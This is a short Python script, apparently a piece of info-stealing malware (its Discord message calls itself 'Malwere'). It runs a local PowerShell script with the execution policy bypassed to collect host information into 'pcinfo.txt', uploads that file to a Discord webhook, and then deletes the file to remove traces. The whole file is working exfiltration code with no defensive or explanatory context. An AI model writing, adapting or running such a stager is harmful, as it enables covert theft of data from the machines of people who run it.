import subprocess
import os
import requests
import time

DISCORD_WEBHOOK_URL = "" 
SCRIPT_PS1 = "pcinfo.ps1"
ARQUIVO_LOG = "pcinfo.txt"

def executar_ps1(caminho_script):
    try:
        caminho_absoluto = os.path.abspath(caminho_script)
        
        if not os.path.exists(caminho_absoluto):
            print(f"erro: Arquivo {caminho_script} nao encontrado.")
            return False

        comando = [
            "powershell.exe", 
            "-ExecutionPolicy", "Bypass", 
            "-File", caminho_absoluto
        ]
        
        subprocess.run(comando, capture_output=True, text=True, check=True)
        return True

    except subprocess.CalledProcessError as e:
        print(f"[-] Erro no PowerShell: {e.stderr}")
        return False

def enviar_para_discord():
    if not os.path.exists(ARQUIVO_LOG):
        print(f"[-] O arquivo de log {ARQUIVO_LOG} nao foi gerado.")
        return

    print("[+] Discord...")
    
    with open(ARQUIVO_LOG, "rb") as f:
        files = {
            "file": (ARQUIVO_LOG, f, "text/plain")
        }
        
        payload = {
            "content": "**Execute Malwere**\nOs dados completos estao no arquivo anexo abaixo:"
        }

        try:
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code in [200, 204]:
                print("[+] sucesso")
                return True
            else:
                print(f"[-] Falha ao enviar: Status {response.status_code}")
                print(response.text)
        except Exception as e:
            print(f"[-] Erro na requisicao: {e}")

def limpar_arquivo():
    try:
        if os.path.exists(ARQUIVO_LOG):
            os.remove(ARQUIVO_LOG)
            print(f"[+] Arquivo {ARQUIVO_LOG} removido com sucesso.")
    except Exception as e:
        print(f"[-] Erro ao deletar arquivo: {e}")

if __name__ == "__main__":
    if executar_ps1(SCRIPT_PS1):
        time.sleep(1)

        if enviar_para_discord():
            limpar_arquivo()